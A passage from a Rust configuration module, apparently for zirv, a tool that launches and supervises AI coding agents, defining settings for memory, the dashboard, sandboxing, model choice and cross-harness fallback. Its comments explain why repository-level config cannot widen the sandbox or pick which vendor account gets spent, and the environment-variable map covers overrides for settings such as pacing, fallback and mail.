    /// independent of `retrieval_max_bytes`'s byte budget -- a ranking that
    /// matches many small entries must not still return dozens of them.
    pub retrieval_max_entries: usize,
    /// Issue #37: the most durable entries one session's own harvest
    /// (`memory::harvest_durable`, called at a rot/timeout restart or a
    /// clean session end) will store, regardless of how many candidates the
    /// model proposes -- a conservative per-session cap, independent of
    /// `init_max_entries`, which caps a whole-repository bootstrap batch
    /// instead of one session's own contribution.
    pub harvest_max_entries: usize,
    /// Issue #37: the cumulative byte budget for one session's own harvest,
    /// summed over every entry it stores -- independent of `max_entry_bytes`
    /// (which caps a single entry) and of `init_max_bytes` (which caps the
    /// bootstrap corpus sent to the model, not what gets written back).
    pub harvest_max_bytes: usize,
}

impl Default for MemoryConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            harvest: false,
            max_entries: 50,
            max_entry_bytes: 512,
            max_injected_bytes: 2048,
            shared_enabled: true,
            core_max_bytes: 2048,
            retrieval_max_bytes: 2048,
            retrieval_max_entries: 6,
            harvest_max_entries: 5,
            harvest_max_bytes: 2048,
        }
    }
}

/// Bookkeeping for the guided `zirv setup` flow (issues #87, #93, #95). Not
/// `REPO_FORBIDDEN`: unlike the workflow/memory tables above, nothing here
/// gates execution of repository content or spend on the operator's
/// behalf -- `memory_harvest_offered`/`statusline_wrap_offered` only decide
/// whether `zirv setup` re-asks a question it already asked, and
/// `backup_retention_runs` only bounds local disk usage under
/// `.zirv/backups/ai-reset`. `setup.rs` is the only writer, and it writes
/// exclusively to the operator's own global `~/.zirv/ctx.toml`, never a
/// repo layer -- see `setup::set_home_ctx_toml_bool`.
#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct SetupConfig {
    /// Count cap on `.zirv/backups/ai-reset` runs, applied on the next
    /// backup write (never on `restore --list`, which stays read-only). The
    /// single oldest run is always pinned outside this cap -- see
    /// `setup::prune_backup_runs`. Clamped like `workflow.
    /// telemetry_max_events`: `0` keeps the built-in default, anything above
    /// the ceiling is clamped down.
    pub backup_retention_runs: usize,
    /// Set once the guided flow has asked whether to turn on automatic
    /// memory harvest, whichever way the operator answered -- so a decline
    /// is not re-asked on every `zirv setup` run.
    pub memory_harvest_offered: bool,
    /// Set once the guided flow has asked whether to wrap an existing
    /// custom Claude statusLine with zirv's usage tee.
    pub statusline_wrap_offered: bool,
}

impl Default for SetupConfig {
    fn default() -> Self {
        Self {
            backup_retention_runs: 20,
            memory_harvest_offered: false,
            statusline_wrap_offered: false,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct ChromeConfig {
    /// The launch banner naming the resolved harness, the rule that chose it,
    /// and the session id.
    pub banner: bool,
    /// The reserved bottom status bar (T12b).
    pub bar: bool,
    /// The `zirv ▸` announcement channel on stderr.
    pub events: bool,
}

impl Default for ChromeConfig {
    fn default() -> Self {
        Self {
            banner: true,
            bar: true,
            events: true,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct DashConfig {
    pub enabled: bool,
    /// Width, in columns, of the persistent sidebar listing every session.
    pub sidebar_cols: u16,
    /// How long a quit-time roster stays offered for restore before a fresh
    /// launch treats it as stale and ignores it.
    pub roster_max_age_secs: u64,
    /// The most panes one dashboard will ever hold at once, counting the
    /// orchestrator. Defaults to 9, matching `DashAction::Switch`'s own
    /// `Ctrl+A 1..9` addressing: a pane nothing can select is a pane nobody
    /// asked for. Enforced wherever a pane is created from something other
    /// than the operator's own launch -- the spawn-request channel and the
    /// `Ctrl+A s` dialog -- so a pane child cannot fork-bomb its own
    /// dashboard into a machine full of harness processes.
    pub max_panes: usize,
    /// Whether the dashboard captures the mouse, which is what makes the
    /// wheel scroll a pane's scrollback.
    ///
    /// A toggle, and defaulted **on**, because it is a genuine trade rather
    /// than a strict improvement: a terminal that is reporting mouse events to
    /// the application no longer performs its own native click-drag text
    /// selection, so an operator who wants to select and copy text has to hold
    /// Shift to bypass the capture (the standard escape hatch every terminal
    /// offers, and the same trade tmux's own `mouse on` makes). Some operators
    /// live in the scrollback and some live in the selection; the wheel is the
    /// more discoverable of the two, so it wins the default, and anyone who
    /// disagrees sets `mouse = false` and still has `Ctrl+A PageUp`/`Home`.
    pub mouse: bool,
    /// How long, in milliseconds, a pane's pty output must have been quiet
    /// before a pane whose adapter has no turn-signal mechanism
    /// (`AgentAdapter::capabilities().turn_signal == false`, codex today) is
    /// treated as `Idle`. Such a pane never reports a turn boundary at all
    /// (`register_turn_signal` is a no-op for it), so `Pane::state`'s usual
    /// `signal_still_stands` gate -- which requires a signal to have been seen
    /// even once -- would leave it `Working` forever, and the mail sweep/nudge
    /// drain, both gated on `Idle`, would never fire into it. This is the
    /// output-quiescence fallback for that case only: a signal-carrying
    /// adapter's pane is untouched by this key, unchanged from before.
    ///
    /// Deliberately **not** `REPO_FORBIDDEN`, unlike every other key in this
    /// table: it is a pure timing/tuning knob over a session the operator
    /// already chose to run interactively in the dashboard, the same class of
    /// decision `pace.soft_percent` is (see that field's own doc comment) --
    /// not a cap standing between an untrusted layer and something it must not
    /// raise for itself (`dash.max_panes`), and not a switch over the
    /// operator's own terminal/machine (`dash.mouse`/`dash.sidebar_cols`).
    pub idle_quiet_ms: u64,
    /// Security review (2026-08-31, issue #228 follow-up): the roots a pane
    /// `--workdir` request (`spawnreq::SpawnRequest::workdir`) must
    /// canonicalise inside before `dash::mod::fulfill_spawn_request` will
    /// honour it. Without a confinement rule, `agent::validate_workdir`'s own
    /// check ("exists, is a directory, sits inside SOME git repository") lets
    /// a same-uid pane's forged request (issue #179's accepted threat model)
    /// obtain write authority over any repo checkout on the machine, not only
    /// ones the operator opened.
    ///
    /// The dashboard's own repo root and that root's parent directory are
    /// always roots, unconditionally -- a sibling checkout (`git worktree add
    /// ../other`, or a plain sibling clone) works with zero configuration,
    /// which is the feature's own use case (issue #228). This list is
    /// ADDITIONAL roots an operator opts into beyond those two, each an
    /// absolute path; a relative or nonexistent entry is kept literally
    /// (canonicalised best-effort, the same lenient fallback `same_directory`
    /// uses) rather than rejected outright, so a typo narrows rather than
    /// crashing the load.
    ///
    /// `REPO_FORBIDDEN`: a repo checkout must not be able to widen which
    /// directories a pane spawned from it may write into -- the exact
    /// privilege-widening asymmetry `sandbox.extra_allow` already holds for
    /// claude's own permission rules. `ZIRV_CTX_DASH_WORKDIR_ROOTS`
    /// (comma-separated, the same shape as `ZIRV_CTX_SANDBOX_EXTRA_ALLOW`)
    /// replaces the merged file value outright, the operator's own final
    /// word.
    pub workdir_roots: Vec<String>,
}

impl Default for DashConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            sidebar_cols: 24,
            roster_max_age_secs: 604_800,
            max_panes: 9,
            mouse: true,
            idle_quiet_ms: 10_000,
            workdir_roots: Vec::new(),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Default, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct ChatConfig {
    /// Model for the interactive orchestrator session, passed through
    /// `AgentAdapter::model_args`. `None` leaves the agent's own default in
    /// place. Deliberately **not** in `REPO_FORBIDDEN` -- see the comment
    /// there and the spec's "Orchestrator model" section
    /// (docs/superpowers/specs/2026-08-13-zirv-dashboard-design.md): unlike
    /// `handoff.model`/`optimize.model`, this only shapes a session the
    /// operator deliberately launched interactively, and the choice is
    /// disclosed on screen at launch rather than spent silently in the
    /// background.
    ///
    /// That disclosure is `chat.rs::announce_model_choice`, on the `zirv
    /// \u{25b8}` announcement channel, **not** the launch banner. The banner
    /// alone was not enough to carry the exemption: `chrome.banner` is not
    /// `REPO_FORBIDDEN`, so the same repo layer that set this key could set
    /// `[chrome] banner = false` beside it and choose the model with nothing
    /// shown anywhere (the `wrap` fallback has no other model surface at
    /// all). `chrome.events` **is** `REPO_FORBIDDEN`, so the announcement is
    /// one a repo cannot silence -- only the operator can, with
    /// `--quiet`/`ZIRV_CTX_QUIET`. The banner and the dashboard header still
    /// show it too, as the standing on-screen copy.
    pub model: Option<String>,
}

/// Per-agent override for which model runs code review, keyed the same way
/// as `UseCreditsConfig` (operator thinks in agent names). `None` -- the
/// default for both -- defers to that adapter's own `AgentAdapter::
/// review_model_below` ladder, computed one tier below the orchestrator
/// seat's model (`chat.model`, or the top tier when unset). `REPO_FORBIDDEN`
/// as a whole table: a repo checkout must not be able to choose which model
/// spends the operator's vendor account running review, the same asymmetry
/// as `handoff.model`/`optimize.model` above. See `resolve_review_model` in
/// `adapters/mod.rs`, the one place both halves (operator override, ladder
/// default) are combined into the harness-roster line an Orchestrator
/// session actually sees.
///
/// That trust claim is fully true only of this table's own keys directly: a
/// repo checkout can still shift the *derived* ladder default indirectly, by
/// setting `chat.model` (deliberately repo-settable -- see that field's own
/// comment -- and disclosed on screen via `announce_model_choice`, unlike
/// this table). That indirection is accepted because it is disclosed the
/// same way a direct `chat.model` choice is, and it can only ever move the
/// ladder default, never set an explicit `review.<agent>` value outright.
#[derive(Debug, Clone, PartialEq, Default, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct ReviewConfig {
    pub claude: Option<String>,
    pub codex: Option<String>,
}

/// Per-agent override for which model a delegated headless worker
/// (`zirv ctx agent <name> "<prompt>"`, and the dashboard's own
/// spawn-request pane variant) launches on. Named `worker`, not `agent`,
/// because a top-level `agent` key already exists (default-agent
/// selection) -- this section is not that.
///
/// `None` -- the default for both -- defers to that adapter's own hard
/// default (`AgentAdapter::default_worker_model`: `"sonnet"` for claude,
/// none for codex, whose own CLI/config default applies untouched). See
/// `adapters::worker_model_args`, the one place both halves (operator
/// override, adapter-owned default) are combined into the argv a
/// delegation spawn actually launches with.
///
/// `REPO_FORBIDDEN` as a whole table, the same trust asymmetry as
/// `review.claude`/`review.codex` right above: a repo checkout must not be
/// able to choose which model -- and so which vendor account -- spends the
/// operator's tokens running a delegated worker. Unlike `review.*`, which
/// only lands in injected prompt *text*, these keys reach a real launch
/// argv directly (`AgentAdapter::model_args`), so the same charset/length/
/// leading-dash guard `validate_model_str` applies to `chat.model`/
/// `review.*` applies to both keys here too -- see the call sites in
/// `CtxConfig::load`.
#[derive(Debug, Clone, PartialEq, Default, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct WorkerConfig {
    pub claude: Option<String>,
    pub codex: Option<String>,
}

/// One harness's three generic tiers (`handover::TIERS`), each an optional
/// literal model id overriding that harness's own built-in ladder entry
/// (`handover::tier_default`). `None` -- the default for all three -- defers
/// to the built-in ladder.
#[derive(Debug, Clone, PartialEq, Default, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct HandoverTierConfig {
    pub cheap: Option<String>,
    pub standard: Option<String>,
    pub deep: Option<String>,
}

/// Per-agent model-id overrides for `zirv ctx handover`'s generic tiers
/// (issue #84), keyed by harness the same way `ReviewConfig`/`WorkerConfig`
/// are. Previously env-var-only (`ZIRV_CTX_HANDOVER_<AGENT>_<TIER>`, see the
/// module doc comment on `handover.rs` for why this table did not exist at
/// first); this is the layered `ctx.toml` counterpart, resolved by
/// `handover::resolve_model` with the identical "operator env always wins"
/// precedence every other model choice in this codebase already follows.
///
/// `REPO_FORBIDDEN` as a whole table, the same trust asymmetry as
/// `review.*`/`worker.*` right above and `agent` itself: swapping the
/// orchestrator seat's harness or model is picking which vendor account gets
/// spent, and a repo checkout must not be able to choose that for the
/// operator. `value_at` matches a table node the same way it matches a leaf
/// (see `pace.use_credits`/`review`/`worker` above), so one entry in
/// `REPO_FORBIDDEN` blocks the whole `[handover]` table, both agents, all
/// three tiers.
#[derive(Debug, Clone, PartialEq, Default, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct HandoverConfig {
    pub claude: HandoverTierConfig,
    pub codex: HandoverTierConfig,
}

/// zirv's own shipped-default launch posture (2026-08-22 decision,
/// harness/model parity round): **sandboxed, no prompts**. Commands run
/// freely inside the repository workspace; anything reaching outside it
/// fails rather than prompting a human. `AgentAdapter::default_sandbox_
/// args()` is each adapter's own honest mapping of this posture -- see that
/// method's own doc comment, `adapters::policy_launch_args` (the seam every
/// real launch calls), and `docs/obsidian/Modules/Ctx Adapters.md`.
///
/// Independent of `[policy]`/`EffectivePolicy`: that table stays all-`Allow`
/// by default ("zirv's per-capability policy declares nothing"), unchanged
/// by this. This is a separate baseline layered underneath it.
///
/// `REPO_FORBIDDEN`: a repo checkout must not be able to turn its own
/// sandboxing off -- that would be a privilege *widening*, the trust
/// asymmetry every other repo-facing toggle in this table already holds to.
/// The operator's own escape hatch, `[sandbox] enabled = false` in
/// `~/.zirv/ctx.toml` or `ZIRV_CTX_SANDBOX=false`, restores the pre-
/// 2026-08-22 behaviour (no baseline argv from this posture at all; a real
/// launch is then governed purely by `[policy]`, exactly as before this
/// struct existed).
///
/// **`extra_allow`/`extra_deny` (fix round 3, 2026-08-22):** the shipped
/// `adapters::SHIPPED_POSTURE_ALLOW`/`_DENY` lists are deliberately small,
/// so an operator whose project needs one more build command has an
/// escape hatch that does not cost them the whole generated deny list --
/// without one, "pin your own `--allowedTools`" (the only alternative)
/// discards every shipped deny too, which is a worse security posture than
/// a slightly wider allow list. Both are claude permission-rule strings
/// (`ClaudeAdapter::default_sandbox_args`'s own vocabulary; codex has no
/// per-command mechanism to receive them, see that method's doc comment).
///
/// - `extra_allow` is **operator-only**: `["sandbox", "extra_allow"]` is a
///   whole-key `REPO_FORBIDDEN` entry (a repo file setting it at all is a
///   hard load error), so it never needs lifting out of the ordinary deep
///   merge -- a repo can never contribute to it, full stop. Env
///   (`ZIRV_CTX_SANDBOX_EXTRA_ALLOW`, comma-separated) replaces the merged
///   file value outright, the operator's own final word, same as every
///   other `REPO_FORBIDDEN` escape hatch.
/// - `extra_deny` is the one list a repo checkout *may* contribute to --
///   narrowing is always safe. Lifted out of the ordinary deep merge in
///   `CtxConfig::load` (the same treatment `[policy]` gets, for the same
///   reason: a plain merge would let the repo layer's array *replace* the
///   operator's instead of adding to it) and resolved as a **union**: the
///   final list is the operator's home-layer entries plus the repo's,
///   never fewer than either. `ZIRV_CTX_SANDBOX_EXTRA_DENY` (comma-
///   separated) replaces the unioned value outright when set -- the
///   operator's own escape hatch to loosen a repo-added entry, the same
///   "environment wins outright in both directions" rule `[policy]`'s own
///   env layer already holds.
///
/// Both extra lists are appended after the shipped ones in `default_
/// sandbox_args`, so deny continues to beat allow across every source --
/// verified live for the shipped pair, and true here by construction: the
/// underlying CLI mechanism does not care which list an entry came from.
///
/// **`scrub_subprocess_env` (issue #329):** whether the generated claude
/// launch settings set `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB=1`. Off by default.
/// Read straight from the installed Claude Code binary (2.1.259), that
/// switch does three things, none of which zirv's launch posture wants
/// unasked: it strips a fixed list of the operator's own tool-config and
/// auth-channel variables from EVERY Bash subprocess, sandboxed or not --
/// `SSH_AUTH_SOCK`, `SSH_AGENT_PID`, `GIT_SSH_COMMAND`, `GH_CONFIG_DIR`,
/// `DOCKER_CONFIG`, `KUBECONFIG`, `GNUPGHOME` and the like -- which is
/// exactly why the `env.SSH_AUTH_SOCK` the same settings file exports never
/// reached a single `git fetch` (#329 item 1); it forces the permission mode
/// to `default`, silently overriding the `dontAsk` a headless launch pins;
/// and it is documented upstream as `allowed_non_write_users` hardening for
/// CI runners, not interactive operator sessions. Credential FILES stay
/// unreadable inside the sandbox regardless (`sandbox.filesystem.denyRead`
/// plus the `Read(...)` deny rules), so turning the scrub off costs only the
/// stripping of credential-bearing environment variables from subprocesses.
///
/// `REPO_FORBIDDEN`, whole key, like `enabled`: the switch changes the
/// launch's permission mode as a side effect, which is the operator's
/// posture to set, not a repo checkout's. `ZIRV_CTX_SANDBOX_SCRUB_SUBPROCESS_
/// ENV` is the operator's own final word.
#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct SandboxConfig {
    pub enabled: bool,
    pub extra_allow: Vec<String>,
    pub extra_deny: Vec<String>,
    pub scrub_subprocess_env: bool,
}

impl Default for SandboxConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            extra_allow: Vec::new(),
            extra_deny: Vec::new(),
            scrub_subprocess_env: false,
        }
    }
}

/// Cross-harness routing policy (issue #186). The operator controls the
/// broad policy in `~/.zirv/ctx.toml`; the repository layer is folded
/// asymmetrically in `CtxConfig::load` so it may only make this feature less
/// eager: disable it, remove candidates, require more candidate headroom,
/// assume less capacity for an unknown signal, or lower the definition of a
/// bounded "small" task. Environment variables are the operator's final word.
#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct FallbackConfig {
    /// Master switch for automatic cross-harness routing and blocked-session
    /// continuation.
    pub enabled: bool,
    /// Stable preference order. Runtime selection still prefers the candidate
    /// with more known/assumed headroom; this order breaks ties.
    pub order: Vec<String>,
    /// New background work may be steered away from its requested harness once
    /// that harness has less than this much percentage headroom.
    pub predictive_headroom_pct: f64,
    /// A fallback candidate must have at least this much percentage headroom.
    pub min_candidate_headroom_pct: f64,
    /// Conservative synthetic headroom for an enabled/ready harness whose usage
    /// signal is absent or stale. Set to 0 to opt such harnesses out.
    pub unknown_headroom_pct: f64,
    /// A capacity-limited ("small tasks only") harness may only receive work
    /// with an explicit token ceiling at or below this value.
    pub small_task_max_tokens: u64,
    /// Or an explicit tool-call ceiling at or below this value. At least one
    /// bounded dimension is required before a small-capacity harness qualifies.
    pub small_task_max_tool_calls: u32,
}

impl Default for FallbackConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            order: vec!["claude".to_string(), "codex".to_string()],
            predictive_headroom_pct: 20.0,
            min_candidate_headroom_pct: 10.0,
            unknown_headroom_pct: 25.0,
            small_task_max_tokens: 40_000,
            small_task_max_tool_calls: 24,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Default, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct CtxConfig {
    pub agent: Option<String>,
    pub agent_bin: Option<String>,
    pub score: ScoreConfig,
    pub wrap: WrapConfig,
    pub supervise: SuperviseConfig,
    pub handoff: HandoffConfig,
    pub pace: PaceConfig,
    pub price: PriceConfig,
    pub optimize: OptimizeConfig,
    pub verify_on_stop: VerifyOnStopConfig,
    pub prompt: PromptConfig,
    pub context: ContextConfig,
    pub mail: MailConfig,
    pub workflow: WorkflowConfig,
    pub report: ReportConfig,
    pub memory: MemoryConfig,
    pub setup: SetupConfig,
    pub chrome: ChromeConfig,
    pub dash: DashConfig,
    pub chat: ChatConfig,
    pub review: ReviewConfig,
    pub worker: WorkerConfig,
    pub handover: HandoverConfig,
    pub fallback: FallbackConfig,
    pub sandbox: SandboxConfig,
    /// Per-agent enable/disable state from `.settings.toml`, a file this type
    /// deliberately never deserializes (see `crate::settings`): loaded
    /// separately at the end of `load`, and rejected outright if it appears
    /// as an `[agents]` table inside `ctx.toml` itself, so the two files stay
    /// distinct.
    #[serde(skip)]
    pub agents: crate::settings::AgentGate,
    /// zirv's canonical permissions policy, from `ctx.toml`'s `[policy]`
    /// table. `skip`ped for the same reason `agents` is: it does **not** go
    /// through this type's deep merge. `[policy]` is lifted out of each layer
    /// before the merge and folded asymmetrically by `policy::resolve`
    /// instead, so a repo checkout can only ever ratchet a stance stricter --
    /// see that function and `policy`'s module doc for why `REPO_FORBIDDEN`
    /// (all-or-nothing per key) cannot express "may narrow, never widen".
    #[serde(skip)]
    pub policy: super::policy::EffectivePolicy,
    /// zirv's harness-neutral command safety policy (issue #83), from
    /// `ctx.toml`'s `[safety]` table. `skip`ped for the same reason `policy`
    /// is: `[safety]` is lifted out of each layer before the deep merge and
    /// folded by `safety::resolve` instead -- see that module's doc comment
    /// for the fold (repo may add `deny`/`ask` entries; `allow`/`default`
    /// are operator-only, enforced via `REPO_FORBIDDEN` upstream of the
    /// fold rather than by the fold itself).
    #[serde(skip)]
    pub safety: super::safety::SafetyPolicy,
    /// Layers that failed to *parse* as TOML (not a schema/`REPO_FORBIDDEN`
    /// rejection -- see `read_layer`) and were skipped rather than aborting
    /// the whole load. Empty on the ordinary path. `skip`ped for the same
    /// reason `agents`/`policy` are: it is populated by `load` directly, not
    /// deserialized from any layer. `zirv ctx status` renders one line per
    /// entry and `zirv ctx optimize` reports one finding per entry; `load`
    /// itself announces once per process on the `zirv \u{25b8}` channel (see
    /// `announce_unparsable_layers_once`).
    #[serde(skip)]
    pub unparsable_layers: Vec<UnparsableLayer>,
}

/// One `ctx.toml` layer (`~/.zirv/ctx.toml` or `<repo>/.zirv/ctx.toml`) that
/// failed to parse as TOML at all -- a syntax error, not a rejected key or an
/// unknown field. `message` is a single line: the parser's own "at line X,
/// column Y" location plus its description, so the operator can find and fix
/// the byte without needing the multi-line diagram `toml::de::Error`'s
/// `Display` renders.
#[derive(Debug, Clone, PartialEq)]
pub struct UnparsableLayer {
    pub path: std::path::PathBuf,
    pub message: String,
    /// `true` for the operator's own `~/.zirv/ctx.toml`, `false` for the
    /// repo's `<repo>/.zirv/ctx.toml`. `load` (the plain, diagnostic-safe
    /// entry point) treats both the same -- skip and continue. `load_for_
    /// launch` (used by every verb that actually launches or supervises a
    /// harness) refuses outright when this is `true`: a broken *home* layer
    /// silently falling back to permissive pacing/policy/sandbox defaults
    /// right before a harness spawns is a security regression, not a mere
    /// inconvenience -- see `load_for_launch`'s own doc comment.
    pub is_home: bool,
}

#[derive(Debug, Clone, Copy)]
enum EnvKind {
    Int,
    Float,
    Bool,
    /// Same parsing as `Bool`, but the parsed value is inverted before being
    /// inserted. `ZIRV_CTX_QUIET=true` needs to become `chrome.events =
    /// false`, and this is the one variable in `ENV_MAP` whose meaning is the
    /// negation of the config key it feeds.
    NegatedBool,
    Str,
}

const ENV_MAP: &[(&str, &[&str], EnvKind)] = &[
    ("ZIRV_CTX_AGENT", &["agent"], EnvKind::Str),
    ("ZIRV_CTX_AGENT_BIN", &["agent_bin"], EnvKind::Str),
    ("ZIRV_CTX_WINDOW", &["score", "window"], EnvKind::Int),
    ("ZIRV_CTX_MIN_TURNS", &["score", "min_turns"], EnvKind::Int),
    (
        "ZIRV_CTX_TOKEN_FLOOR",
        &["score", "token_floor"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_TOKEN_CEILING",
        &["score", "token_ceiling"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_SCORE_TOKEN_FLOOR_RATIO",
        &["score", "token_floor_ratio"],
        EnvKind::Float,
    ),
    (
        "ZIRV_CTX_SCORE_TOKEN_CEILING_RATIO",
        &["score", "token_ceiling_ratio"],
        EnvKind::Float,
    ),
    (
        "ZIRV_CTX_SCORE_MODEL_CONTEXT_TOKENS",
        &["score", "model_context_tokens"],
        EnvKind::Int,
    ),
    ("ZIRV_CTX_MARKER", &["score", "marker"], EnvKind::Str),
    (
        "ZIRV_CTX_DEBOUNCE_MS",
        &["wrap", "debounce_ms"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_INJECT_TIMEOUT_MS",
        &["wrap", "inject_timeout_ms"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_MAX_RESTARTS",
        &["supervise", "max_restarts"],
        EnvKind::Int,
    ),
    ("ZIRV_CTX_POLL_MS", &["supervise", "poll_ms"], EnvKind::Int),
    (
        "ZIRV_CTX_INTERVAL_SECS",
        &["supervise", "interval_secs"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_MAX_CYCLE_SECS",
        &["supervise", "max_cycle_secs"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_MAX_FAILURES",
        &["supervise", "max_failures"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_ON_FAILURE",
        &["supervise", "on_failure"],
        EnvKind::Str,
    ),
    (
        "ZIRV_CTX_MAX_NUDGES",
        &["supervise", "max_nudges"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_SUPERVISE_MAX_HEAVY_WORKERS",
        &["supervise", "max_heavy_workers"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_SUPERVISE_MAX_HEAVY_OPERATIONS",
        &["supervise", "max_heavy_operations"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_SUPERVISE_MAX_WRITERS",
        &["supervise", "max_writers"],
        EnvKind::Int,
    ),
    ("ZIRV_CTX_MODEL", &["handoff", "model"], EnvKind::Str),
    (
        "ZIRV_CTX_HANDOFF_TIMEOUT_SECS",
        &["handoff", "timeout_secs"],
        EnvKind::Int,
    ),
    ("ZIRV_CTX_PACE", &["pace", "enabled"], EnvKind::Bool),
    (
        "ZIRV_CTX_PACE_MAX_PERCENT",
        &["pace", "max_percent"],
        EnvKind::Float,
    ),
    (
        "ZIRV_CTX_PACE_FALLBACK_SECS",
        &["pace", "fallback_delay_secs"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_PACE_MAX_WAIT_SECS",
        &["pace", "max_wait_secs"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_PACE_SLACK_SECS",
        &["pace", "wait_slack_secs"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_PACE_JITTER_SECS",
        &["pace", "jitter_secs"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_FIVE_HOUR_BUDGET",
        &["pace", "five_hour_budget_tokens"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_SEVEN_DAY_BUDGET",
        &["pace", "seven_day_budget_tokens"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_PACE_SOFT_PERCENT",
        &["pace", "soft_percent"],
        EnvKind::Float,
    ),
    (
        "ZIRV_CTX_PACE_POLL",
        &["pace", "poll_enabled"],
        EnvKind::Bool,
    ),
    (
        "ZIRV_CTX_PACE_POLL_MIN_INTERVAL_SECS",
        &["pace", "poll_min_interval_secs"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_PACE_BLIND_DELAY_SECS",
        &["pace", "blind_delay_secs"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_PACE_SPAWN_SOFT_PCT",
        &["pace", "spawn_soft_pct"],
        EnvKind::Float,
    ),
    (
        "ZIRV_CTX_PACE_SPAWN_HARD_PCT",
        &["pace", "spawn_hard_pct"],
        EnvKind::Float,
    ),
    (
        "ZIRV_CTX_PACE_RUN_BUDGET_TOKENS",
        &["pace", "run_budget_tokens"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_PACE_USE_CREDITS_CLAUDE",
        &["pace", "use_credits", "claude"],
        EnvKind::Bool,
    ),
    (
        "ZIRV_CTX_PACE_USE_CREDITS_CODEX",
        &["pace", "use_credits", "codex"],
        EnvKind::Bool,
    ),
    ("ZIRV_CTX_FALLBACK", &["fallback", "enabled"], EnvKind::Bool),
    (
        "ZIRV_CTX_FALLBACK_PREDICTIVE_HEADROOM_PCT",
        &["fallback", "predictive_headroom_pct"],
        EnvKind::Float,
    ),
    (
        "ZIRV_CTX_FALLBACK_MIN_CANDIDATE_HEADROOM_PCT",
        &["fallback", "min_candidate_headroom_pct"],
        EnvKind::Float,
    ),
    (
        "ZIRV_CTX_FALLBACK_UNKNOWN_HEADROOM_PCT",
        &["fallback", "unknown_headroom_pct"],
        EnvKind::Float,
    ),
    (
        "ZIRV_CTX_FALLBACK_SMALL_TASK_MAX_TOKENS",
        &["fallback", "small_task_max_tokens"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_FALLBACK_SMALL_TASK_MAX_TOOL_CALLS",
        &["fallback", "small_task_max_tool_calls"],
        EnvKind::Int,
    ),
    ("ZIRV_CTX_OPTIMIZE", &["optimize", "enabled"], EnvKind::Bool),
    (
        "ZIRV_CTX_OPTIMIZE_SESSIONS",
        &["optimize", "sessions_sampled"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_OPTIMIZE_MODEL",
        &["optimize", "model"],
        EnvKind::Str,
    ),
    ("ZIRV_CTX_SANDBOX", &["sandbox", "enabled"], EnvKind::Bool),
    (
        "ZIRV_CTX_SANDBOX_SCRUB_SUBPROCESS_ENV",
        &["sandbox", "scrub_subprocess_env"],
        EnvKind::Bool,
    ),
    ("ZIRV_CTX_PROMPT", &["prompt", "enabled"], EnvKind::Bool),
    (
        "ZIRV_CTX_PROMPT_REPO",
        &["prompt", "repo_layer"],
        EnvKind::Bool,
    ),
    (
        "ZIRV_CTX_PROMPT_MAX_REPO_BYTES",
        &["prompt", "max_repo_bytes"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_PROMPT_HARNESSES",
        &["prompt", "harnesses"],
        EnvKind::Bool,
    ),
    (
        "ZIRV_CTX_PROMPT_CODEX_ORCHESTRATOR",
        &["prompt", "codex_orchestrator"],
        EnvKind::Bool,
    ),
    (
        "ZIRV_CTX_CONTEXT_MAX_COMMON_BYTES",
        &["context", "max_common_bytes"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_CONTEXT_MAX_HARNESS_BYTES",
        &["context", "max_harness_bytes"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_CONTEXT_MAX_HARNESS_ROSTER_BYTES",
        &["context", "max_harness_roster_bytes"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_CONTEXT_LINT_MAX_PAIRS",
        &["context", "lint_max_pairs"],
        EnvKind::Int,
    ),
    ("ZIRV_CTX_MAIL", &["mail", "enabled"], EnvKind::Bool),
    (
        "ZIRV_CTX_MAIL_MAX_MESSAGE_BYTES",
        &["mail", "max_message_bytes"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_MAIL_MAX_DELIVERED_BYTES",
        &["mail", "max_delivered_bytes"],
        EnvKind::Int,
    ),
    ("ZIRV_CTX_MAIL_KEEP", &["mail", "keep"], EnvKind::Int),
    (
        "ZIRV_CTX_WORKFLOW_REPO_CHECKS",
        &["workflow", "repo_checks_enabled"],
